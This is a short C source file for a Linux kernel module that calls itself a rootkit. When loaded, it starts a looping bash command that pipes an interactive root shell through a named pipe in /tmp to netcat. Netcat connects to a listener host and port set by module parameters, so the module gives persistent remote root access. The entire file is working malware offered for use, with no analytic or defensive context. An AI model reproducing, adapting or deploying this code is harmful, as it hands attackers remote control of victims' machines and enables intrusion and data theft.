#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/kmod.h>
#include<linux/moduleparam.h>
#include<linux/stat.h>

#define AUTHOR "meep"

/*const*/ static char * lhost = "REVERSE_SHELL_LHOST=x.x.x.x"; //CHANGE x.x.x.x TO LISTENER IP
/*const*/ static char * lport = "REVERSE_SHELL_LPORT=6666";
module_param(lhost, charp, 0000);
module_param(lport, charp, 0000);

static int __init module_load(void) {
	char *envirproc[] = {"HOME=/root", "TERM=xterm",
			     lhost, lport,
			     NULL
	};
	char *argv[] = {"/bin/bash", "-c",
			"while true; do /usr/bin/rm /tmp/r00tk1t;/usr/bin/mkfifo /tmp/r00tk1t;/usr/bin/cat /tmp/r00tk1t|/bin/sh -i 2>&1|/usr/bin/netcat $REVERSE_SHELL_LHOST $REVERSE_SHELL_LPORT>/tmp/r00tk1t; done&",
			NULL
	};

	printk(KERN_INFO "R00TK1T START\n");
	call_usermodehelper(argv[0], argv, envirproc,UMH_WAIT_EXEC);
	return 0;
}

static void __exit module_unload(void) {
	printk(KERN_INFO "R00TK1T STOP\n");
	return;
}

module_init(module_load);
module_exit(module_unload);

MODULE_AUTHOR(AUTHOR);

